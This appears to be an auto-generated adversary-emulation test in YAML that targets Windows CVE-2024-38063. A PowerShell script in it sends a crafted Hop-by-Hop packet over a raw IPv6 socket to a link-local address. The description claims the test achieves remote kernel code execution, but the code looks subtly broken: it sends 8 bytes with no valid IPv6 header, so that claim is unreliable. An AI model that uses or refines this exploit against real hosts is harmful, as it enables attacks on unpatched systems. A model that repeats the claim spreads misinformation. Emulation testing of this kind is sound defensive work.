# Auto-generated by CIPHER v5.0
# Source: a8bb0f5fab1a
attack_technique: T1210
display_name: "T1210 - Exploit CVE-2024-38063 (IPv6 Hop-by-Hop Options Integer Underflow)"
atomic_tests:
  - name: "T1210 - Exploit CVE-2024-38063 (IPv6 Hop-by-Hop Options Integer Underflow)"
    description: |
      Sends a crafted IPv6 packet with an invalid Hop‑by‑Hop option (Option Type > 0x80) to trigger the integer underflow in Ipv6pProcessOptions, achieving remote kernel code execution on unpatched Windows.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $target = "fe80::1234:abcd:5678:ef90"
        $bytes = [byte[]] (0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00) # Option Type 0x81 + padding to 8 bytes
        $sock = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetworkV6,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::IPv6)
        $sock.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::IPv6, [System.Net.Sockets.SocketOptionName]::HeaderIncluded, $true)
        $packet = $bytes
        $sock.SendTo($packet, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($target),0)))
      cleanup_command: |
        # No cleanup needed; IPv6 remains enabled.
